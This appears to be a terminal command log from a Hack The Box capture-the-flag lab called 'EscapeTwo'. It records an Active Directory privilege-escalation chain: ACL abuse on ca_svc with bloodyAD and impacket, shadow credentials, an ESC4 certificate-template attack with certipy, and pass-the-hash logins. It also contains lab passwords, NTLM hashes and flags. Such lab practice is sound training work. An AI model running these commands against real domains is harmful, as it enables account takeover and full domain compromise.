+[2026-01-14 17:32:17] [pane=%1] [CMD] : #note user ryan had the user flag 4a47439602ef6d09189d88bffe3be131
+[2026-01-14 17:42:33] [pane=%1] [CMD] : #note bloodhound data reveals that ryan has WriteOwner over ca_svc. 
+[2026-01-14 20:51:28] [pane=%1] [CMD] source ~/.zshrc
+[2026-01-14 20:51:38] [pane=%1] [CMD] tmux kill-server
+[2026-01-14 20:53:09] [pane=%0] [CMD] tmux kill-server 2>/dev/null
+[2026-01-15 11:50:14] [pane=%0] [CMD] cd ~/Documents/obsidian/docs/CTF/HTB/EscapeTwo
+[2026-01-15 11:51:35] [pane=%0] [CMD] bloodyAD -d sequel.htb ryan -p 'WqSZAF6CysDQbGb3' --host 10.129.232.128 set owner ca_svc ryan
+[2026-01-15 11:51:58] [pane=%0] [CMD] bloodyAD -d sequel.htb ryan -p 'WqSZAF6CysDQbGb3' --host 10.129.232.128 set owner ca_svc add ryan
+[2026-01-15 11:52:14] [pane=%0] [CMD] bloodyAD -d sequel.htb ryan -p 'WqSZAF6CysDQbGb3' --host 10.129.232.128 set owner ca_svc set ryan
+[2026-01-15 11:52:28] [pane=%0] [CMD] bloodyAD -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' --host 10.129.232.128 set owner ca_svc ryan
+[2026-01-15 11:53:12] [pane=%0] [CMD] sudo bloodyAD -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' --host 10.129.232.128 set owner ca_svc ryan
+[2026-01-15 11:55:52] [pane=%0] [CMD] ping -c 3 10.129.232.128
+[2026-01-15 11:56:29] [pane=%0] [CMD] sudo vim /etc/hosts
+[2026-01-15 11:57:03] [pane=%0] [CMD] ping -c 3 10.129.232.128
+[2026-01-15 11:57:28] [pane=%0] [CMD] sudo vim /etc/hosts
+[2026-01-15 11:57:49] [pane=%0] [CMD] ping -c 3 10.129.232.128
+[2026-01-15 12:01:33] [pane=%0] [CMD] cat /etc/hosts
+[2026-01-15 12:01:58] [pane=%0] [CMD] ping -c 3 10.129.232.128
+[2026-01-15 12:02:40] [pane=%0] [CMD] sudo vim /etc/hosts
+[2026-01-15 12:02:59] [pane=%0] [CMD] ping -c 3 10.129.232.128
+[2026-01-15 12:03:18] [pane=%0] [CMD] sudo vim /etc/hosts
+[2026-01-15 12:03:39] [pane=%0] [CMD] cat /etc/hosts
+[2026-01-15 12:03:43] [pane=%0] [CMD] ping -c 3 10.129.232.128
+[2026-01-15 12:10:38] [pane=%0] [CMD] ping -c 3 10.129.63.111
+[2026-01-15 12:11:05] [pane=%0] [CMD] bloodyAD -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' --host 10.129.63.111 set owner ca_svc ryan
+[2026-01-15 12:12:16] [pane=%0] [CMD] bloodyAD -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' --host 10.129.63.111 add genericAll ca_svc ryan
+[2026-01-15 12:30:11] [pane=%0] [CMD] bloodyAD -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' --host 10.129.63.111 add writeDACL ca_svc ryan
+[2026-01-15 12:32:25] [pane=%0] [CMD] bloodyAD -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' --host 10.129.63.111 add genericAll ca_svc ryan
+[2026-01-15 14:30:31] [pane=%0] [CMD] evil-winrm -i -u ryan -p 'WqSZAF6CysDQbGb3'         
+
+[2026-01-15 14:31:04] [pane=%0] [CMD] evil-winrm -i 10.129.63.111 -u ryan -p 'WqSZAF6CysDQbGb3'         
+
+[2026-01-15 14:34:18] [pane=%0] [CMD] ldapsearch -H ldap://10.129.63.111 -D 'sequel.htb\ryan' -w 'WqSZAF6CysDQbGb3' \
+    -b 'DC=sequel,DC=htb' '(sAMAccountName=ca_svc)' dn
+[2026-01-15 14:34:58] [pane=%0] [CMD] impacket-dacledit -action read -target ca_svc sequel.htb/ryan:'WqSZAF6CysDQbGb3' -dc-ip
+  10.129.63.111
+[2026-01-15 14:35:20] [pane=%0] [CMD] impacket-dacledit -action read -target ca_svc sequel.htb/ryan:'WqSZAF6CysDQbGb3' -dc-ip  10.129.63.111
+[2026-01-15 14:41:05] [pane=%0] [CMD] impacket-owneredit -action write -owner ryan -target ca_svc sequel.htb/ryan:'WqSZAF6CysDQbGb3' -dc-ip 10.129.63.111
+
+[2026-01-15 14:41:54] [pane=%0] [CMD] impacket-owneredit -action write -owner ryan -target ca_svc sequel.htb/ryan:'WqSZAF6CysDQbGb3' -dc-ip 10.129.63.111
+
+[2026-01-15 14:43:10] [pane=%0] [CMD] impacket-owneredit -action write -new-owner ryan -target ca_svc sequel.htb/ryan:'WqSZAF6CysDQbGb3' -dc-ip 10.129.63.111
+
+[2026-01-15 14:43:44] [pane=%0] [CMD] impacket-dacledit.py -action write -rights FullControl -principal ryan -target ca_svc sequel.htb/ryan:'WqSZAF6CysDQbGb3' -dc-ip 10.129.63.111
+[2026-01-15 14:43:51] [pane=%0] [CMD] impacket-dacledit -action write -rights FullControl -principal ryan -target ca_svc sequel.htb/ryan:'WqSZAF6CysDQbGb3' -dc-ip 10.129.63.111
+[2026-01-15 14:45:20] [pane=%0] [CMD] bloodyAD -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' --host 10.129.63.111 set password ca_svc 'Password123!'
+[2026-01-15 14:46:42] [pane=%0] [CMD] : #note used impacket-owneredit to make ryan owner over ca-svc
+[2026-01-15 14:47:19] [pane=%0] [CMD] : #note used impacket-dacledit to give ryan full control over cs_svc
+[2026-01-15 14:47:53] [pane=%0] [CMD] : #note used bloodyAD to reset the password to 'Password123!'
+[2026-01-15 14:52:01] [pane=%0] [CMD] nxc winrm 10.129.63.111 -u ca_svc -p 'Password1234!'
+[2026-01-15 14:53:23] [pane=%0] [CMD] evil-winrm -i 10.129.63.111 -u ca_svc -p 'Password123!'
+[2026-01-15 14:53:57] [pane=%0] [CMD] nxc winrm 10.129.63.111 -u ca_svc -p 'Password123!'
+[2026-01-15 14:54:23] [pane=%0] [CMD] bloodyAD -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' --host 10.129.63.111 set password ca_svc 'Password123!'
+[2026-01-15 14:56:24] [pane=%0] [CMD] nxc smb 10.129.63.111 -u ca_svc -p 'Password123!'
+[2026-01-15 14:56:57] [pane=%0] [CMD] nxc smb 10.129.63.111 -u ca_svc -p 'Password123!' 
+[2026-01-15 15:06:59] [pane=%0] [CMD] ldapsearch -H ldap://10.129.63.111 -D 'sequel.htb\ca_svc' -w 'Password123!' -b 'DC=sequel,DC=htb' '(sAMAccountName=ca_svc)' dn
+[2026-01-15 15:18:21] [pane=%0] [CMD] smbclient //10.129.63.111/ -U "ca_svc"%'Password123!'
+[2026-01-15 15:21:15] [pane=%0] [CMD] smbclient //10.129.63.111/ -U "ca_svc"%'Password123!' --shares
+[2026-01-15 15:24:05] [pane=%0] [CMD] evil-winrm -i 10.129.63.111 -u ca_svc -p 'Password123!'
+[2026-01-15 15:32:22] [pane=%0] [CMD] evil-winrm -i 10.129.63.111 -u ryan -p 'WqSZAF6CysDQbGb3'         
+
+[2026-01-15 15:44:17] [pane=%1] [CMD] cd ~/Documents/obsidian/docs/CTF/HTB/EscapeTwo/
+[2026-01-15 15:44:49] [pane=%1] [CMD] impacket-getTGT sequel.htb/ca_svc:'Password123!' -dc-ip 10.129.63.111
+[2026-01-15 16:08:35] [pane=%0] [CMD] certipy shadow auto -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' -dc-ip 10.129.63.111 -target ca_svc
+[2026-01-15 16:11:16] [pane=%0] [CMD] bloodyAD -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' --host 10.129.63.111 add shadowCredentials ca_svc ryan
+
+[2026-01-15 16:11:36] [pane=%0] [CMD] bloodyAD -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' --host 10.129.63.111 add shadowCredentials ca_svc ryan
+[2026-01-15 16:11:40] [pane=%0] [CMD] bloodyAD -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' --host 10.129.63.111 add shadowCredentials ca_svc
+[2026-01-15 16:12:30] [pane=%0] [CMD] bloodyAD -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' --host 10.129.63.111 add shadowCredentials ca_svc ryan
+[2026-01-15 16:15:49] [pane=%0] [CMD] : #note I can't get creds we changed for ca_svc to authenicate anywhere - smb, ldap, winrm. next attempting shadow credentials with bloodyAD
+[2026-01-15 16:16:23] [pane=%0] [CMD] bloodyAD -d sequel.htb --host 10.129.63.111 -u ryan -p 'WqSZAF6CysDQbGb3' set  owner ca_svc ryan
+[2026-01-15 16:16:55] [pane=%0] [CMD] bloodyAD -d sequel.htb --host 10.129.63.111 -u ryan -p 'WqSZAF6CysDQbGb3' add genericAll ca_svc ryan
+[2026-01-15 16:17:15] [pane=%0] [CMD] bloodyAD -d sequel.htb --host 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan
+[2026-01-15 16:17:37] [pane=%0] [CMD] bloodyAD -d sequel.htb --host 10.129.63.111 -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan
+[2026-01-15 16:18:42] [pane=%0] [CMD] certipy shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account 'ca_svc' -dc-ip 10.129.63.111
+[2026-01-15 16:19:38] [pane=%0] [CMD] bloodyAD -d sequel.htb --host 10.129.63.111 -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan
+[2026-01-15 16:19:50] [pane=%0] [CMD] sudo bloodyAD -d sequel.htb --host 10.129.63.111 -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan
+[2026-01-15 16:21:39] [pane=%0] [CMD] bloodyAD -d sequel.htb --host 10.129.63.111 -u ryan -p 'WqSZAF6CysDQbGb3' set owner ca_svc ryan
+[2026-01-15 16:21:57] [pane=%0] [CMD] bloodyAD -d sequel.htb --host 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan
+[2026-01-15 16:22:08] [pane=%0] [CMD] bloodyAD -d sequel.htb --host 10.129.63.111 -u ryan -p 'WqSZAF6CysDQbGb3' set owner ca_svc ryan
+[2026-01-15 16:22:28] [pane=%0] [CMD] bloodyAD -d sequel.htb --host 10.129.63.111 -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan
+[2026-01-15 16:22:41] [pane=%0] [CMD] certipy shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account 'ca_svc' -dc-ip 10.129.63.111
+[2026-01-15 16:28:46] [pane=%0] [CMD] : #note adding a shadow credential to ca_svc doesn't work at first because ryan is not curently the owner of ca_svc. so we made him the owner of ca_svc with BloodyAD, then gave ryan GenericAll over ca_svc with bloodyAD also, and finally use certipy shadow to pull down the hash of ca_svc.
+[2026-01-15 16:29:16] [pane=%0] [CMD] nxc smb 10.129.63.111 -u ca_svc -H 3b181b914e7a9d5508ea1e20bc2b7fce
+[2026-01-15 16:30:15] [pane=%0] [CMD] evil-winrm -i 10.129.63.111 -u ca_svc -H 3b181b914e7a9d5508ea1e20bc2b7fce
+[2026-01-15 16:31:16] [pane=%0] [CMD] : #note now to run certipy with ca_svc hash to look for vulnerable tempates
+[2026-01-15 16:37:00] [pane=%0] [CMD] certipy find -vulnerable -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.63.111 -stdout
+[2026-01-15 16:59:42] [pane=%0] [CMD] : #note ESC4 vulnerabiliity found on DunderMifflinAuthentication template
+[2026-01-15 17:01:07] [pane=%0] [CMD] : #note why is it vulnerable? ca_svc is in Certs Publishers group, Cert Publishers has full control over this template and I can modify the template to make it abusable.
+[2026-01-15 17:02:06] [pane=%0] [CMD] certipy find -vulnerable -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.63.111 -stdout > loot/certipy-esc4.txt
+[2026-01-15 17:02:47] [pane=%0] [CMD] cat loot/certipy-esc4.txt
+[2026-01-15 17:04:01] [pane=%0] [CMD] : #note now modifying the template (enable SubjectAltName + grand myself enrollment)
+[2026-01-15 17:06:25] [pane=%0] [CMD] certipy template -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.63.111 -template DunderMifflinAuthentication -save-old
+[2026-01-15 17:06:38] [pane=%0] [CMD] certipy template -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.63.111 -template DunderMifflinAuthentication --save-old
+[2026-01-15 17:09:38] [pane=%0] [CMD] ll loot
+[2026-01-15 17:10:12] [pane=%0] [CMD] mv loot/certipy-esc4.txt loot/certipy-esc4.txt.old
+[2026-01-15 17:10:20] [pane=%0] [CMD] ll loot
+[2026-01-15 17:10:49] [pane=%0] [CMD] cp loot/certipy-esc4.txt.old loot/certipy-esc4.txt
+[2026-01-15 17:12:05] [pane=%0] [CMD] certipy template -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.63.111 -template DunderMifflinAuthentication
+[2026-01-15 17:12:13] [pane=%0] [CMD] ll
+[2026-01-15 17:14:02] [pane=%0] [CMD] certipy template -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.63.111 -template DunderMifflinAuthentication -configuration DunderMifflinAuthentication.json
+[2026-01-15 17:16:12] [pane=%0] [CMD] certipy template -h
+[2026-01-15 17:59:12] [pane=%0] [CMD] certipy template -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.63.111 -template DunderMifflinAuthentication -write-default-configuration
+[2026-01-15 17:59:25] [pane=%0] [CMD] ll
+[2026-01-15 18:01:25] [pane=%0] [CMD] certipy req -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.63.111 -template DunderMifflinAuthentication -upn administrator@sequel.htb
+[2026-01-15 18:02:07] [pane=%0] [CMD] certipy req -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.63.111 -template DunderMifflinAuthentication -upn administrator@sequel.htb -target DC01.sequel.htb
+[2026-01-15 18:02:38] [pane=%0] [CMD] certipy req -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.63.111 -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn administrator@sequel.htb
+[2026-01-15 18:04:16] [pane=%0] [CMD] certipy req -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.63.111 -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn administrator@sequel.htb -dns DC01.sequel.htb
+[2026-01-15 18:04:40] [pane=%0] [CMD] certipy req -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.63.111 -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn administrator@sequel.htb -dns DC01.sequel.htb
+[2026-01-15 18:06:15] [pane=%0] [CMD] certipy req -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.63.111 -ca sequel-DC01-CA -template DunderMifflinAuthentication
+[2026-01-15 18:09:00] [pane=%0] [CMD] ll
+[2026-01-15 18:10:09] [pane=%0] [CMD] cat DunderMifflinAuthentication.json
+[2026-01-15 18:12:02] [pane=%0] [CMD] vim DunderMifflinAuthentication.json
+[2026-01-15 18:13:34] [pane=%0] [CMD] certipy template -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.63.111 -template DunderMifflinAuthentication -write-default-configuration
+[2026-01-15 18:14:25] [pane=%0] [CMD] certipy req -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.63.111 -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn administrator@sequel.htb
+[2026-01-15 18:18:14] [pane=%0] [CMD] certipy auth -pfx administrator.pfx -dc-ip 10.129.63.111
+[2026-01-15 18:19:37] [pane=%0] [CMD] : #note certipy wizardry pulled hash for administrator.htb:7a8d4e04986afa8ed4060f75e5a0b3ff
+[2026-01-15 18:20:54] [pane=%0] [CMD] evil-winrm -i 10.129.63.111 -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
+[2026-01-15 20:15:28] [pane=%0] [CMD] : #note *Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
+f6d2fc168461b54909f4e8b495aec471
+
